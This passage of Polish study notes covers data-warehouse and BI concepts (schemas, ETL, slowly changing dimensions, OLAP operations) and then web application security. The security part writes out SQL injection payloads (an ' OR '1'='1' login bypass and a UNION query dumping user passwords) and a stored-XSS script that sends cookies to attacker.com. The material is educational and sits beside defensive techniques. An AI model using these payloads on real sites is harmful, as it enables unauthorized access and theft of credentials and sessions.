
---

## 5. Projektowanie i implementacja systemów business intelligence

### 5.1. Różnice między hurtownią danych i data mart

**Hurtownia danych (Data Warehouse):**
- Scentralizowana baza danych dla całej organizacji
- Obsługuje wszystkie obszary biznesowe (sprzedaż, finanse, HR, produkcja)
- Integruje dane z wielu heterogenicznych źródeł
- Większa skala, wyższe koszty implementacji
- Długi czas budowy (6-12 miesięcy)

**Data Mart:**
- Wyodrębniona część hurtowni dla konkretnego działu/funkcji
- Skoncentrowany na jednym obszarze (np. sprzedaż, marketing)
- Mniejszy zakres danych, szybsze zapytania
- Tańszy i szybszy do implementacji (2-3 miesiące)
- Większa wydajność dzięki specjalizacji

**Przykład:** Hurtownia zawiera dane o wszystkich aspektach firmy, podczas gdy data mart sprzedażowy zawiera tylko dane o transakcjach, klientach i produktach.

### 5.2. Modele danych stosowane w hurtowniach danych

**Schemat Gwiazdy (Star Schema):**
- Jedna centralna tabela faktów + tabele wymiarów bezpośrednio połączone
- Tabele wymiarów zdenormalizowane (2NF)
- Prostsze zapytania, szybsza wydajność
- Większa redundancja danych
- Najczęściej używany model

**Schemat Płatka Śniegu (Snowflake Schema):**
- Rozszerzenie schematu gwiazdy
- Tabele wymiarów znormalizowane na wielu poziomach
- Bardziej złożone zapytania (więcej JOIN-ów)
- Mniejsza redundancja, lepsza integracja danych
- Używany przy dużych tabelach wymiarów

**Przykład:** W schemacie gwiazdy tabela produktów zawiera wszystkie atrybuty. W schemacie płatka śniegu jest podzielona na produkty → kategorie → grupy kategorii.

### 5.3. Możliwe architektury hurtowni danych

### 1. Architektura scentralizowana (Inmon – Corporate Information Factory)
- **Opis:** Dane z różnych źródeł trafiają do centralnej hurtowni EDW – Enterprise Data Warehouse.
- **Cechy:**  
  - Dane znormalizowane (3NF)
  - Single source of truth
  - Z hurtowni budowane są dedykowane Data Marty
- **Zalety:** spójność danych, kontrola jakości
- **Wady:** trudna i długa implementacja, mniejsza elastyczność

---

### 2. Architektura zorientowana na Data Marty (Kimball – Bus Architecture)
- **Opis:** Dane ładowane bezpośrednio do tematycznych Data Martów (np. sprzedaż, marketing, finanse)
- **Cechy:**  
  - Podejście bottom-up
  - Schemat gwiazdy lub płatka śniegu
  - Data Marty łączą wspólne wymiary ("bus-matrix")
- **Zalety:** szybkie wdrożenie, łatwa analiza
- **Wady:** trudności z utrzymaniem spójności w dużych organizacjach

---

### 3. Architektura hybrydowa
- **Opis:** Kompromis – budowa centralnej EDW i równoległe tworzenie Data Martów dla biznesu
- **Cechy:** Centralna kontrola + szybkie efekty dla działów biznesowych

---

### 4. Architektura trójwarstwowa (klasyczna)
- **Warstwa źródłowa:** systemy operacyjne (OLTP), ERP, CRM, pliki, API
- **Warstwa integracyjna:** staging area, ETL/ELT, hurtownia danych (DWH)
- **Warstwa prezentacji:** narzędzia BI (OLAP, dashboardy, raporty)
- **Cechy:** Najpowszechniej stosowana architektura w praktyce

---

### 5. Architektura Data Lake
- **Opis:** Dane trafiają do centralnego repozytorium w formie surowej, często pół-strukturalne lub niestrukturalne
- **Technologie:** Hadoop, S3, Data Lake platformy
- **Zastosowania:** Big data, machine learning, IoT
- **Zalety:** duża elastyczność, obsługa wielu typów danych
- **Wady:** brak standaryzacji, ryzyko "data swamp"

---

### 6. Architektura Data Lakehouse (nowoczesna)
- **Opis:** Połączenie elastyczności Data Lake i spójności, wydajności hurtowni
- **Technologie:** Delta Lake, Snowflake, BigQuery, Iceberg
- **Cechy:** Jedna platforma do transakcji, analiz, i ML
- **Zalety:** niższe koszty, unikanie duplikacji danych

---

### 7. Architektura w chmurze (serverless / cloud-native)
- **Opis:** Hurtownia jako usługa (DWH-as-a-Service); platformy cloud-native
- **Przykłady:** BigQuery, Amazon Redshift, Azure Synapse
- **Zalety:** elastyczne skalowanie, brak zarządzania infrastrukturą
- **Wady:** zależność od dostawcy, koszt przy dużych wolumenach

---

### 📌 Podsumowanie:
- **Inmon:** centralizacja i spójność
- **Kimball:** szybkość wdrożenia, prostota dla użytkownika biznesowego
- **Hybrydowa:** kompromis
- **Lake, Lakehouse, Cloud:** elastyczność, wsparcie dla AI/big data, nowoczesne podejście

**Przykład zastosowania:** Bank używa architektury 3-warstwowej: systemy transakcyjne → ODS (dane dzienne) → hurtownia (dane historyczne) → raporty.

### 5.4. Różnice między hurtownią danych i systemem klasy ERP

| Aspekt | ERP | Hurtownia danych |
|--------|-----|------------------|
| **Cel** | Obsługa procesów operacyjnych | Analiza i raportowanie |
| **Typ przetwarzania** | OLTP (transakcyjne) | OLAP (analityczne) |
| **Dane** | Bieżące, operacyjne | Historyczne, zagregowane |
| **Użytkownicy** | Pracownicy operacyjni | Analitycy, menedżerowie |
| **Zapytania** | Szybkie, proste | Złożone, długotrwałe |
| **Aktualizacje** | Częste (real-time) | Okresowe (ETL) |

**Przykład:** ERP rejestruje sprzedaż produktu w czasie rzeczywistym, hurtownia analizuje trendy sprzedażowe za ostatnie 3 lata.

### 5.5. Pojęcia "Fakt", "Wymiar" oraz "Miara"

**Fakt:**
- Centralna tabela przechowująca dane liczbowe i metryki
- Zawiera klucze obce do tabel wymiarów
- Przechowuje wydarzenia biznesowe
- **Przykład:** tabela sprzedaży z danymi o transakcjach

**Wymiar:**
- Tabele opisujące kontekst faktów
- Zawierają atrybuty opisowe i hierarchie
- Używane do filtrowania i grupowania
- **Przykłady:** klient, produkt, czas, lokalizacja

**Miara:**
- Wartości liczbowe w tabeli faktów
- Podlegają agregacji (SUM, AVG, COUNT)
- Kluczowe wskaźniki wydajności (KPI)
- **Przykłady:** kwota sprzedaży, ilość, koszt, zysk

**Przykład:** W analizie sprzedaży: Fakt=transakcja sprzedażowa, Wymiary=klient/produkt/data, Miary=kwota/ilość.

### 5.6. Procesy zachodzące w ramach działań ETL

**Extract (Ekstrakcja):**
- Pobieranie danych z systemów źródłowych
- Źródła: bazy danych, pliki CSV/XML, API, systemy ERP/CRM
- Metody: full load, incremental load, real-time streaming
- Walidacja jakości na poziomie źródła

**Transform (Transformacja):**
- **Czyszczenie danych:** usuwanie duplikatów, błędnych wartości
- **Normalizacja:** ujednolicenie formatów (daty, waluty)
- **Agregacja:** tworzenie sum, średnich, wskaźników
- **Wzbogacanie:** dodawanie nowych kolumn, obliczeń
- **Mapowanie:** dopasowanie struktur źródłowych do docelowych

**Load (Ładowanie):**
- Wprowadzanie danych do hurtowni
- Tryby: append (dodawanie), overwrite (zastąpienie), upsert (update+insert)
- Indeksowanie i optymalizacja wydajności

**Przykład:** Ekstrakcja zamówień z systemu e-commerce → transformacja walut na PLN → ładowanie do hurtowni w schemacie gwiazdy.

### 5.7. Wymiary wolnozmienne i ich rodzaje

**SCD Type 0 (Ignoruj):**
- Zmiany są ignorowane
- Dane pozostają niezmienione
- **Zastosowanie:** dane historyczne, które nie powinny się zmieniać

**SCD Type 1 (Nadpisz):**
- Nowa wartość zastępuje starą
- Brak historii zmian
- **Zastosowanie:** korekty błędów, nieistotne zmiany

**SCD Type 2 (Dodaj wiersz):**
- Każda zmiana tworzy nowy rekord
- Pełna historia zmian z datami ważności
- **Zastosowanie:** śledzenie wszystkich zmian w czasie

**SCD Type 3 (Dodaj kolumnę):**
- Poprzednia wartość w dodatkowej kolumnie
- Historia ograniczona (zwykle 2 wartości)
- **Zastosowanie:** śledzenie poprzedniej wartości

**Przykład SCD Type 2:**
```
ID | Nazwa_produktu | Cena | Data_od    | Data_do    | Aktualny
1  | Laptop Pro     | 3000 | 2023-01-01 | 2023-06-30 | N
2  | Laptop Pro     | 2800 | 2023-07-01 | NULL       | Y
```

### 5.8. Architektura systemu business intelligence

**Warstwa źródeł danych:**
- Systemy operacyjne (ERP, CRM)
- Pliki (CSV, XML, JSON)
- Bazy danych (SQL, NoSQL)
- Usługi webowe (API, web services)

**Warstwa integracji danych (ETL/ELT):**
- Narzędzia ETL (SSIS, Talend, Pentaho)
- Data quality tools
- Master data management (MDM)

**Warstwa przechowywania:**
- Hurtownia danych (Data Warehouse)
- Data marts tematyczne
- Operational Data Store (ODS)
- Data Lakes dla big data

**Warstwa analityczna:**
- Kostki OLAP (MOLAP, ROLAP, HOLAP)
- In-memory databases
- Cached aggregations

**Warstwa prezentacji:**
- Raporty i dashboardy
- Ad-hoc query tools
- Mobile applications
- Self-service BI tools

### 5.9. Operacje realizowane w ramach ROLAP

**ROLAP (Relational OLAP)** - przechowywanie danych w relacyjnych bazach z wielowymiarowym interfejsem:

**Podstawowe operacje:**

**Roll-up (Agregacja):**
- Przejście na wyższy poziom hierarchii
- Przykład: miasto → województwo → kraj
- Zmniejszenie szczegółowości danych

**Drill-down (Drążenie):**
- Przejście na niższy poziom hierarchii  
- Przykład: rok → kwartał → miesiąc
- Zwiększenie szczegółowości danych

**Slice (Przekrój):**
- Wybór jednej wartości wymiaru
- Przykład: dane tylko dla 2023 roku
- Tworzenie 2D widoku z 3D kostki

**Dice (Kostka):**
- Wybór podzbioru wartości w wielu wymiarach
- Przykład: Q1-Q2 2023, regiony A-C
- Tworzenie mniejszej kostki

**Pivot/Rotate (Obrót):**
- Zmiana orientacji wymiarów
- Zamiana wierszy z kolumnami
- Różne perspektywy tych samych danych

### 5.10. Wiodące narzędzia business intelligence

**Microsoft Power BI:**
- **Zalety:** Niska cena, integracja z Office 365, łatwość użytkowania
- **Wady:** Ograniczenia w wizualizacjach, zależność od ekosystemu Microsoft
- **Cena:** $10-20/użytkownik/miesiąc
- **Najlepsze dla:** Firm używających Microsoft Office

**Tableau:**
- **Zalety:** Najlepsze wizualizacje, intuicyjny drag-and-drop, data discovery
- **Wady:** Wysokie koszty, złożoność dla zaawansowanych funkcji
- **Cena:** $42-75/użytkownik/miesiąc  
- **Najlepsze dla:** Analityków danych, eksploracji wizualnej

**Qlik Sense/QlikView:**
- **Zalety:** Asocjacyjny model danych, szybkie analizy ad-hoc, in-memory
- **Wady:** Krzywa uczenia, wyższe koszty infrastruktury
- **Cena:** Na zapytanie (enterprise pricing)
- **Najlepsze dla:** Zaawansowanych analiz, dużych zbiorów danych

**Inne narzędzia:**
- **SAP BusinessObjects:** Kompleksowa platforma enterprise
- **Oracle BI:** Integracja z bazami Oracle
- **IBM Cognos:** Rozwiązania korporacyjne
- **Looker (Google):** Cloud-native BI

---

## 6. Bezpieczeństwo aplikacji internetowych

### 6.1. Atak SQL Injection - pojęcie i przykłady

**Definicja:** SQL Injection to metoda ataku polegająca na wstrzyknięciu złośliwego kodu SQL do aplikacji webowej w celu manipulacji bazą danych.

**Mechanizm ataku:**
1. Atakujący znajduje formularz lub URL przyjmujący dane
2. Wprowadza kod SQL zamiast normalnych danych
3. Aplikacja wykonuje złośliwe zapytanie
4. Atakujący uzyskuje dostęp do danych lub modyfikuje bazę

**Przykład klasyczny:**
```sql
-- Formularz logowania
SELECT * FROM users WHERE username = 'admin' AND password = 'hasło';

-- Atak: wprowadzenie w pole password: ' OR '1'='1' --
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1' --';

-- Rezultat: zawsze prawda, logowanie bez hasła
```

**Typy ataków SQL Injection:**

**Union-based:**
```sql
-- Normalne zapytanie
SELECT name, price FROM products WHERE id = 1;

-- Atak UNION
SELECT name, price FROM products WHERE id = 1 UNION SELECT username, password FROM users;
```

**Boolean-based:**
- Zadawanie pytań typu prawda/fałsz
- Odkrywanie struktury bazy przez próby

**Time-based:**
- Wykorzystanie opóźnień do wykrywania podatności
- SLEEP() lub WAITFOR DELAY

### 6.2. Techniki obrony przed atakami SQL Injection

**1. Parametryzowane zapytania (Prepared Statements):**
```php
// Źle - podatne na SQLi
$query = "SELECT * FROM users WHERE username = '$username'";

// Dobrze - parametryzowane
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$username]);
```

**2. Stored Procedures:**
```sql
-- Procedura składowana z parametrami
CREATE PROCEDURE GetUser(@Username NVARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @Username;
END
```

**3. Sanityzacja i walidacja danych:**
```python
import re

# Walidacja danych wejściowych
def validate_input(user_input):
    # Tylko litery i cyfry
    if re.match("^[a-zA-Z0-9]*$", user_input):
        return user_input
    else:
        raise ValueError("Invalid input")
```

**4. Escaping znaków specjalnych:**
```php
$username = mysqli_real_escape_string($connection, $_POST['username']);
```

**5. Ograniczenie uprawnień bazy danych:**
- Konto aplikacji z minimalnymi uprawnieniami
- Brak uprawnień DROP, ALTER dla kont aplikacji
- Oddzielne konta dla różnych funkcji

**6. WAF (Web Application Firewall):**
- Filtrowanie zapytań na poziomie sieci
- Wykrywanie wzorców ataków
- Blokowanie podejrzanego ruchu

### 6.3. Atak XSS - pojęcie i przykłady

**XSS (Cross-Site Scripting)** - wstrzyknięcie złośliwego JavaScript do strony webowej, wykonywany w przeglądarce ofiary.

**Typy ataków XSS:**

**Reflected XSS (odbity):**
- Kod JavaScript w URL lub formularzu
- Wykonany natychmiast w odpowiedzi serwera
- Wymaga nakłonienia ofiary do kliknięcia w link

**Przykład:**
```html
<!-- URL: http://example.com/search?q=<script>alert('XSS')</script> -->
<p>Wyniki wyszukiwania dla: <script>alert('XSS')</script></p>
```

**Stored XSS (przechowany):**
- Kod zapisany w bazie danych (komentarze, profile)
- Wykonywany przy każdym wyświetleniu
- Najbardziej niebezpieczny typ

**Przykład:**
```html
<!-- Komentarz w bazie: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script> -->
```

**DOM-based XSS:**
- Manipulacja DOM przez JavaScript
- Atak całkowicie po stronie klienta

### 6.4. Porównanie metod uwierzytelniania użytkowników

**Session-based Authentication:**
- Serwer przechowuje informacje o sesji
- Klient otrzymuje session ID w cookie
- **Zalety:** bezpieczeństwo, kontrola po stronie serwera
- **Wady:** problemy ze skalowalnością

**Token-based Authentication (JWT):**
- Bezstanowy token zawierający informacje użytkownika
- Podpisany cyfrowo, self-contained
- **Zalety:** skalowalność, niezależność od serwera
- **Wady:** trudności z unieważnieniem, rozmiar tokenu

**OAuth 2.0:**
- Standard autoryzacji dla aplikacji trzecich
- Delegacja uprawnień bez udostępniania haseł
- **Zastosowanie:** logowanie przez Google/Facebook

**Multi-Factor Authentication (MFA):**
- Kombinacja czynników: wiedza, posiadanie, biometria
- **Przykład:** hasło + SMS + odcisk palca
- Znacznie zwiększa bezpieczeństwo

**Porównanie:**
| Metoda | Bezpieczeństwo | Skalowalność | Złożoność implementacji |
|--------|----------------|--------------|------------------------|
| Session-based | Wysokie | Średnia | Niska |
| JWT | Średnie | Wysoka | Średnia |
| OAuth 2.0 | Wysokie | Wysoka | Wysoka |
| MFA | Bardzo wysokie | Zależne | Wysoka |

### 6.5. Powody rejestrowania aktywności użytkowników

**Bezpieczeństwo:**
- Wykrywanie prób włamań i ataków
- Śledzenie nieautoryzowanego dostępu
- Analiza wzorców podejrzanej aktywności
- Forensics po incydentach bezpieczeństwa

**Zgodność z przepisami (Compliance):**
- RODO - prawo do informacji o przetwarzaniu
- SOX - kontrola dostępu do danych finansowych
- HIPAA - ochrona danych medycznych
- ISO 27001 - zarządzanie bezpieczeństwem informacji

**Audyt i raportowanie:**
- Śledzenie zmian w krytycznych systemach
- Raportowanie dla audytorów wewnętrznych
- Dowody w postępowaniach prawnych
- Analiza wydajności i optymalizacja

**Przykładowe zdarzenia do logowania:**
- Logowanie i wylogowanie użytkowników
- Nieudane próby uwierzytelniania
- Zmiany uprawnień i ról
- Dostęp do wrażliwych danych
- Modyfikacje konfiguracji systemu

### 6.6. Przechowywanie uprawnień użytkowników w bazie danych

**Model RBAC (Role-Based Access Control):**
```sql
-- Tabela użytkowników
CREATE TABLE users (
    user_id INT PRIMARY KEY,
    username VARCHAR(50),
    email VARCHAR(100),
    created_at TIMESTAMP
);

-- Tabela ról
CREATE TABLE roles (
    role_id INT PRIMARY KEY,
    role_name VARCHAR(50),
    description TEXT
);

-- Tabela uprawnień
CREATE TABLE permissions (
    permission_id INT PRIMARY KEY,
    permission_name VARCHAR(50),
    resource VARCHAR(50),
    action VARCHAR(50)
);

-- Przypisanie ról do użytkowników
CREATE TABLE user_roles (
    user_id INT,
    role_id INT,
    assigned_at TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(user_id),
    FOREIGN KEY (role_id) REFERENCES roles(role_id)
);

-- Przypisanie uprawnień do ról
CREATE TABLE role_permissions (
    role_id INT,
    permission_id INT,
    FOREIGN KEY (role_id) REFERENCES roles(role_id),
    FOREIGN KEY (permission_id) REFERENCES permissions(permission_id)
);
```

**Przykład implementacji:**
```sql
-- Sprawdzenie uprawnień użytkownika
SELECT DISTINCT p.permission_name, p.resource, p.action
FROM users u
JOIN user_roles ur ON u.user_id = ur.user_id
JOIN roles r ON ur.role_id = r.role_id
JOIN role_permissions rp ON r.role_id = rp.role_id
JOIN permissions p ON rp.permission_id = p.permission_id
WHERE u.username = 'john_doe'
AND p.resource = 'orders'
AND p.action = 'read';
```

### 6.7. Cel testowania bezpieczeństwa aplikacji internetowej

**Główne cele:**

**Identyfikacja podatności:**
- Wykrycie luk w zabezpieczeniach przed atackiem
- Ocena konfiguracji bezpieczeństwa
- Testowanie mechanizmów uwierzytelniania i autoryzacji

**Walidacja implementacji:**
- Sprawdzenie zgodności z wymaganiami bezpieczeństwa
- Weryfikacja poprawności konfiguracji
- Testowanie scenariuszy edge case

**Ocena ryzyka:**
- Określenie prawdopodobieństwa i wpływu zagrożeń
- Priorytetyzacja działań naprawczych
- Oszacowanie kosztów potencjalnych ataków

**Rodzaje testów bezpieczeństwa:**

**SAST (Static Application Security Testing):**
- Analiza kodu źródłowego
- Wykrywanie podatności w czasie rozwoju
- **Narzędzia:** SonarQube, Checkmarx, Veracode

**DAST (Dynamic Application Security Testing):**
- Testowanie działającej aplikacji
- Symulacja ataków z perspektywy atakującego
- **Narzędzia:** OWASP ZAP, Burp Suite, Nessus

**IAST (Interactive Application Security Testing):**
- Kombinacja SAST i DAST
- Analiza w czasie rzeczywistym podczas testów

**Penetration Testing:**
- Ręczne testowanie przez ekspertów
- Symulacja rzeczywistych ataków
- Najdokładniejsza ocena bezpieczeństwa

### 6.8. Rozpoznawanie tożsamości zalogowanego użytkownika

**Session cookies:**
```php
// Tworzenie sesji po logowaniu
session_start();
$_SESSION['user_id'] = $user_id;
$_SESSION['username'] = $username;
$_SESSION['role'] = $user_role;

// Sprawdzenie tożsamości
if (isset($_SESSION['user_id'])) {
    $current_user = $_SESSION['user_id'];
}
```

**JWT Tokens:**
```javascript
// Przechowywanie tokenu
localStorage.setItem('token', jwt_token);

// Walidacja tokenu
const token = localStorage.getItem('token');
const payload = jwt.verify(token, secret_key);
const user_id = payload.user_id;
```

**HTTP Headers:**
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

**Database session storage:**
```sql
-- Tabela sesji
CREATE TABLE sessions (
    session_id VARCHAR(128) PRIMARY KEY,
    user_id INT,
    created_at TIMESTAMP,
    last_activity TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT
);

-- Walidacja sesji
SELECT user_id FROM sessions 
WHERE session_id = ? 
AND last_activity > NOW() - INTERVAL 30 MINUTE;
```

**Bezpieczne praktyki:**
- Regeneracja session ID po logowaniu
- Timeout sesji po nieaktywności
- Secure i HttpOnly flags dla cookies
- Walidacja IP i User-Agent
- Logout - usunięcie sesji z serwera i klienta
